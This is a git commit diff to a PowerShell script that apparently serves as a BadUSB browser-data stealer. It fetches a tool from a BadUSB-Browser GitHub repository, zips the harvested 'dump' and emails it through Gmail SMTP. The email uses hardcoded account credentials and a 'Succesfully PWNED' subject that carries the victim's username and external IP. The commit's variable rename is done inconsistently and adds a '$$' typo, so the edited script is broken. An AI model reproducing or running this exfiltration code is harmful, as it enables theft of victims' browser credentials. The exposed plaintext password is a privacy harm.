4b98490ce1aac04f51ef63c94c07105938d0b143
epicthoistaken <94729955+epicthoistaken@users.noreply.github.com>
2022-02-04 23:06:29 -0500

    Update googlechromescript.ps1

--- googlechromescript.ps1
+++ googlechromescript.ps1
@@ -10,19 +10,19 @@ Invoke-WebRequest 'https://github.com/GamehunterKaan/BadUSB-Browser/raw/main/hac
 Compress-Archive -Path * -DestinationPath dump.zip
 $Random = Get-Random
 #Mailing the output you will need to enable less secure app access on your google account for this to work
-$Message = new-object Net.Mail.MailMessage
+$ReportEmail = new-object Net.Mail.MailMessage
 $smtp = new-object Net.Mail.SmtpClient("smtp.gmail.com", 587)
 $smtp.Credentials = New-Object System.Net.NetworkCredential("beneafrr@gmail.com", "Milo36912!");
 $smtp.EnableSsl = $true
 $Message.From = "beneafrr@gmail.com"
 $Message.To.Add("beneafrr@gmail.com")
 $ip = Invoke-RestMethod "myexternalip.com/raw"
-$Message.Subject = "Succesfully PWNED " + $env:USERNAME + "! (" + $ip + ")"
+$ReportEmail.Subject = "Succesfully PWNED " + $env:USERNAME + "! (" + $ip + ")"
 $ComputerName = Get-CimInstance -ClassName Win32_ComputerSystem | Select Model,Manufacturer
-$Message.Body = $ComputerName
+$$ReportEmail.Body = $ComputerName
 $files=Get-ChildItem 
-$Message.Attachments.Add("$env:appdata\Microsoft\dump\dump.zip")
-$smtp.Send($Message)
+$ReportEmail.Attachments.Add("$env:appdata\Microsoft\dump\dump.zip")
+$smtp.Send($ReportEmail)
 $Message.Dispose()
 $smtp.Dispose()
 #Cleanup
